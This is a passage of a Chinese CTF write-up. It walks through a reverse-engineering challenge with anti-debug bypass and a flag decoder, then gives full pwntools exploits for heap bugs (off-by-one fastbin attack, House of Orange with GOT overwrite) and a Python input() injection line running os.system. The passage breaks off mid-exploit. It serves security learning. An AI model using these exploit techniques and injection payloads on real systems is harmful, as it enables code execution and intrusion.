class="hljs-number">12</span>h,<span class="hljs-number">91</span>h.rdata:<span class="hljs-number">00402150</span>                 db <span class="hljs-number">50</span>h,<span class="hljs-number">12</span>h,<span class="hljs-number">0</span>D2h,<span class="hljs-number">91</span>h,<span class="hljs-number">92</span>h,<span class="hljs-number">1</span>Eh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">90</span>h,<span class="hljs-number">0</span>D2h,<span class="hljs-number">9</span>Fh</code></pre></div><p>这42个数据进行对比。</p><p>那么思路就是过了反调试，定位关键处理输入的代码处，进行确定其是怎么操作数据的，但是看了一会没有找到，就开始想办法寻找字符映射来碰撞flag。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">1</span> &gt; <span class="hljs-number">0x92</span><span class="hljs-number">2</span> &gt; <span class="hljs-number">0xd2</span><span class="hljs-number">3</span> &gt; <span class="hljs-number">0x12</span><span class="hljs-number">4</span> &gt; <span class="hljs-number">0x51</span><span class="hljs-number">5</span> &gt; <span class="hljs-number">0x91</span><span class="hljs-number">6</span> &gt; <span class="hljs-number">0xd1</span><span class="hljs-number">7</span> &gt; <span class="hljs-number">0x11</span><span class="hljs-number">8</span> &gt; <span class="hljs-number">0x50</span><span class="hljs-number">9</span>&gt; <span class="hljs-number">0x90</span><span class="hljs-number">0</span> &gt; <span class="hljs-number">0x52</span>a &gt; <span class="hljs-number">0x9e</span>c &gt; <span class="hljs-number">0x1e</span>d &gt; <span class="hljs-number">0x5d</span> s &gt; <span class="hljs-number">0x22</span>- &gt; <span class="hljs-number">0x8b</span>f &gt; <span class="hljs-number">0xdd</span>l &gt; <span class="hljs-number">0x5b</span>a &gt; <span class="hljs-number">0x9e</span>g &gt; <span class="hljs-number">0x1d</span></code></pre></div><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-type">key</span> = [<span class="hljs-number">0xDD</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x51</span>,   <span class="hljs-number">0x11</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0x12</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9F</span>]</code></pre></div><p>然后进行一位位替换，获得flag：</p><div class="hljs"><pre><code class="hljs undefined">flag&#123;a959951b<span class="hljs-number">-76</span>ca<span class="hljs-number">-4784</span>-add7<span class="hljs-number">-93583251</span>ca92&#125;</code></pre></div><p>主程序很简单，要求输入42位的flag。</p><div class="hljs"><pre><code class="hljs undefined">Handles = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, StartAddress, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);v5 = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, loc_401200, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)sub_401240, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);WaitForMultipleObjects(<span class="hljs-number">2</span>u, &amp;Handles, <span class="hljs-number">1</span>, <span class="hljs-number">0xFFFFFFFF</span>);</code></pre></div><p>开始新的线程：</p><div class="hljs"><pre><code class="hljs undefined">void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter)&#123;  <span class="hljs-keyword">while</span> ( !IsDebuggerPresent() )    ;  puts((int)<span class="hljs-string">"debug!\n"</span>);  <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>这有一个反调试。用的IsDebuggerPresent，过的办法很简单，在x64dbg中在进入IsDebuggerPresent时，输入dbh，隐藏调试器即可。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/BPs5Q6.png" srcset="/img/loading.gif" alt></p><p>测试在这里dbh即可。<br>￼￼￼￼￼￼￼￼<br>还有对你的input进行处理，处理完以后与<br><img src="http://qiqianyun.chumen77.xyz/uPic/vXxpNH.png" srcset="/img/loading.gif" alt></p><p>这42个数据进行对比。</p><p>先过了反调试，定位关键处理输入的代码处（0x401223），进行确定其是怎么操作数据的，看了一会发现没有如此简单，但是发现你输入特定字符，经过程序处理出来的都是一样的:</p><p>随意输入<code>flag{==2332311111111111111111122222222211}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/vXXqPj.png" srcset="/img/loading.gif" alt></p><p>可以打印字符不算多，这就可以可以建立一个映射表：<br>输入<code>flag{1234567890qwertyuiopasdfghjkbnmmmmmm}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/3GOgJx.png" srcset="/img/loading.gif" alt></p><p>处理完：<br><img src="http://qiqianyun.chumen77.xyz/uPic/zsN4o0.png" srcset="/img/loading.gif" alt><br>获取映射表：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">1</span> &gt; <span class="hljs-number">0x92</span><span class="hljs-number">2</span> &gt; <span class="hljs-number">0xd2</span><span class="hljs-number">3</span> &gt; <span class="hljs-number">0x12</span><span class="hljs-number">4</span> &gt; <span class="hljs-number">0x51</span><span class="hljs-number">5</span> &gt; <span class="hljs-number">0x91</span><span class="hljs-number">6</span> &gt; <span class="hljs-number">0xd1</span><span class="hljs-number">7</span> &gt; <span class="hljs-number">0x11</span><span class="hljs-number">8</span> &gt; <span class="hljs-number">0x50</span><span class="hljs-number">9</span>&gt; <span class="hljs-number">0x90</span><span class="hljs-number">0</span> &gt; <span class="hljs-number">0x52</span>f &gt; <span class="hljs-number">0xdd</span>l &gt; <span class="hljs-number">0x5b</span>a &gt; <span class="hljs-number">0x9e</span>g &gt; <span class="hljs-number">0x1d</span>a &gt; <span class="hljs-number">0x9e</span>c &gt; <span class="hljs-number">0x1e</span>d &gt; <span class="hljs-number">0x5d</span> s &gt; <span class="hljs-number">0x22</span>- &gt; <span class="hljs-number">0x8b</span></code></pre></div><p>提取一下key：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-type">key</span> = [<span class="hljs-number">0xDD</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,  <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x51</span>,   <span class="hljs-number">0x11</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x90</span>,   <span class="hljs-number">0x12</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9F</span>]</code></pre></div><p>然后进行一位位替换，获得flag：</p><div class="hljs"><pre><code class="hljs undefined">flag&#123;a959951b<span class="hljs-number">-76</span>ca<span class="hljs-number">-4784</span>-add7<span class="hljs-number">-93583251</span>ca92&#125;</code></pre></div><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>可以确定一下ida无法识别的数据段，是被花指令处理过了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/yY437o.png" srcset="/img/loading.gif" alt><br>这里开始往下识别异常，在动态调试后，提取一下正确的汇编代码，根据正确的算法进行patch掉花指令。（还是注意dbh隐藏一下调试器。）</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __stdcall __<span class="hljs-function">noreturn <span class="hljs-title">sub_401120</span><span class="hljs-params">(LPVOID lpThreadParameter)</span></span>&#123;  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// ebx</span>  CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, hHandle, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  WaitForSingleObject(hHandle, <span class="hljs-number">0xFFFFFFFF</span>);  inputs[<span class="hljs-number">0</span>] = (inputs[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">6</span>) ^ ((<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">unsigned</span> __int8)inputs[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">2</span>);  inputs[<span class="hljs-number">0</span>] ^= <span class="hljs-number">0x23</span>u;  Sleep(<span class="hljs-number">6u</span>);  v1 = *(<span class="hljs-keyword">unsigned</span> __int8 *)(__readfsdword(<span class="hljs-number">0x30</span>u) + <span class="hljs-number">2</span>);  inputs[<span class="hljs-number">0</span>] += <span class="hljs-number">0x23</span>;  JUMPOUT(loc_4011EC);&#125;</code></pre></div><p>Patch 后的，勉强可以看懂。其中肯定是<code>inputs[i]</code>进行处理的，其中也有一个地方在加1。</p><div class="hljs"><pre><code class="hljs python">key = [    <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,     <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x51</span>,     <span class="hljs-number">0x11</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x90</span>,     <span class="hljs-number">0x12</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x90</span>,     <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9F</span>]flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):    key[i] -= <span class="hljs-number">0x23</span>    key[i] &amp;= <span class="hljs-number">0xff</span> <span class="hljs-comment">#有可能运算后会小于0的，所以给处理一下</span>    key[i] ^= <span class="hljs-number">0x23</span>    key[i] = ((key[i] &gt;&gt; <span class="hljs-number">6</span>) ^ (key[i] &lt;&lt; <span class="hljs-number">2</span>)) &amp; <span class="hljs-number">0xff</span>    flag += chr(key[i])print(flag)</code></pre></div><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>ubuntu 16，off by one，没有show函数，需要攻击stdout泄漏libc地址。</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ul><li>用off by one，构造出chunk overlapping ,并且想办法释放堆块，让<code>main_arena_</code>落在fastbin中</li><li>修改这个<code>main_arena_</code>的最后2个字节，让其指向<code>stdout</code>附近带有<code>0x7f</code>的地址（属于0x70的fastbin堆块）</li><li>使用chunk overlapping ，来修改空闲的fastbin chain，使其中一个指向这个带有<code>main_arena</code>的堆块，进行fastbin attack，修改到stdout处的内容，leak libc</li><li>重复以上的步骤，构造一个堆块到<code>malloc_hook</code>处，写上one gadget 即可。</li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'101.200.53.148'</span>,<span class="hljs-number">34521</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">alloca</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sla(<span class="hljs-string">'len'</span>,str(size))    sa(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-comment"># def pwn():</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">1</span>,<span class="hljs-number">0x4f0</span>,<span class="hljs-string">'\xdd\xd5'</span>)    alloca(<span class="hljs-number">2</span>,<span class="hljs-number">0xb0</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'aa'</span>)    free(<span class="hljs-number">0</span>)    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">'/bin/sh\x00'</span>*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">'\xc1'</span>)    free(<span class="hljs-number">1</span>)    alloca(<span class="hljs-number">1</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\xdd\xd5'</span>)    alloca(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x50\x47'</span>)    alloca(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x50\x47'</span>)    alloca(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x50\x47'</span>)    alloca(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">8</span>,<span class="hljs-number">0x160</span>,<span class="hljs-string">'aaaaaa'</span>)    alloca(<span class="hljs-number">9</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'aa'</span>)    alloca(<span class="hljs-number">10</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aa'</span>)    free(<span class="hljs-number">7</span>)    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">0x38</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + <span class="hljs-string">'\xe1'</span>)    free(<span class="hljs-number">8</span>)    free(<span class="hljs-number">4</span>)    free(<span class="hljs-number">9</span>)    free(<span class="hljs-number">5</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x160</span>    alloca(<span class="hljs-number">11</span>,<span class="hljs-number">0x180</span>,payload)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x160</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">'\x20'</span>    alloca(<span class="hljs-number">11</span>,<span class="hljs-number">0x180</span>,payload)    alloca(<span class="hljs-number">12</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    <span class="hljs-comment"># debug()</span>    alloca(<span class="hljs-number">13</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">14</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\xed\xca'</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span> + p64(<span class="hljs-number">0xfbad3c80</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p8(<span class="hljs-number">0</span>)    alloca(<span class="hljs-number">15</span>,<span class="hljs-number">0x60</span>,payload)<span class="hljs-comment"># leak_addr()</span>leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./pwn'</span>)        <span class="hljs-comment"># io = remote('101.200.53.148',34521)</span>        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)rec = <span class="hljs-number">0xf1207</span> + libc_base<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getshell</span><span class="hljs-params">()</span>:</span>    alloca(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">11</span>)    free(<span class="hljs-number">6</span>)    alloca(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>)    alloca(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\xed\xca'</span>)    free(<span class="hljs-number">4</span>)    free(<span class="hljs-number">13</span>)    free(<span class="hljs-number">12</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">'\x90'</span>    alloca(<span class="hljs-number">13</span>,<span class="hljs-number">0x90</span>,payload)    alloca(<span class="hljs-number">11</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x20\xd0'</span>)    alloca(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x20\xd0'</span>)    alloca(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'\x20\xd0'</span>)    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(rec)    alloca(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,payload)    <span class="hljs-comment"># debug()</span>    sleep(<span class="hljs-number">0.1</span>)    <span class="hljs-comment"># alloca(8,30,'1')</span>getshell()itr()</code></pre></div><p>深夜写的exp，估计构造堆块的思路有点混乱。🤣🤣</p><h3 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h3><p>比赛时没有做出来，开始以为是个webpwn，不敢去做。但是很多队伍做出来了，试着去做，看到server.py,不了解jsc，以为只能执行js代码，废了很大精力写js来读取flag，还是没有成功。tcl。</p><p>最后看wp，知道了input函数本身就是个漏洞函数，其会将stdin输入的内容当做python代码去执行（就像执行计算式一样，将其看做python代码，通过计算返回结果）。当然可以用它来执行命令，不过需要先倒入os的模块，然后执行系统命令。</p><div class="hljs"><pre><code class="hljs python">__import__(<span class="hljs-string">'os'</span>).system(<span class="hljs-string">'cat /home/ctf/flag'</span>)</code></pre></div><p>对于python，input函数漏洞，参考链接：<br><a href="https://blog.csdn.net/weixin_34221332/article/details/92713257" target="_blank" rel="noopener">https://blog.csdn.net/weixin_34221332/article/details/92713257</a></p><h3 id="no-free"><a href="#no-free" class="headerlink" title="no free"></a>no free</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><div class="hljs"><pre><code class="hljs python">*] <span class="hljs-string">'/ctf/work/ciscn2020/pwn/nofree/pwn'</span>    Arch:     amd64<span class="hljs-number">-64</span>-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (<span class="hljs-number">0x400000</span>)</code></pre></div><p>可以看到保护开的还是很少的，然后no free 明显需要使用到hos of orange进行攻击了。</p><h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h5><ul><li>只能申请0-0x90大小的堆块，堆块号自定义0-2，且由于没有对已经存在的堆块号验证，可以进行无限次的申请同一个序号的堆块。</li><li>堆块地址存在于<code>0x06020C0  + 0x100</code> size 跟在后面。</li><li><code>strdup</code> 相当于<code>malloc(stren(s))</code> </li></ul><h5 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h5><ul><li>倘若输入没有存在的堆块idx，程序会直接返回</li><li><code>read_diy(key[2 * idx + 0x20], (unsigned __int64)key[2 * idx + 0x21]);</code> 这里由于是这样的判断，结合add的<code>strdup</code> 就造成了堆溢出。</li></ul><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>难点基本就在泄漏libc了。</p><ul><li>利用程序的堆溢出漏洞，修改一下top chunk</li><li>申请多次0号0x90的堆块，来消耗修改后的top chunk，到达一定程度后进行hos of orange攻击，获取一个空闲的进入fastbin的堆块</li><li>利用堆溢出，在fastbin chain上加一个<code>0x06020C0  + 0x100</code> ，准备进行fastbin attack，来获取一个在存放堆块地址的堆块，这样就实现了任意地址写。</li><li>修改<code>atoi</code> 的got 表为 printf，创造出一个格式化字符串漏洞</li><li>利用add中的atoi，完成格式化字符串漏洞的利用，泄漏出libc地址</li><li>利用格式化字符串漏洞，修改<code>atoi</code> 的got表为<code>elf.plt[&#39;atoi&#39;] + 6</code> ，让其完成一下解析，重新构造出正常的atoi（原因：测速中发现，用edit功能输入idx后直接退出，只能让其恢复正常，再进行任意地址写）</li><li>修改<code>atoi</code> 的got为system的地址，然后在发送个<code>sh</code> ，完成<code>system(sh)</code></li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">"content"</span>,str(data))payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x40</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xfb1</span>)edit(<span class="hljs-number">0</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x90</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">24</span>):    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x10</span>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">0</span>,<span 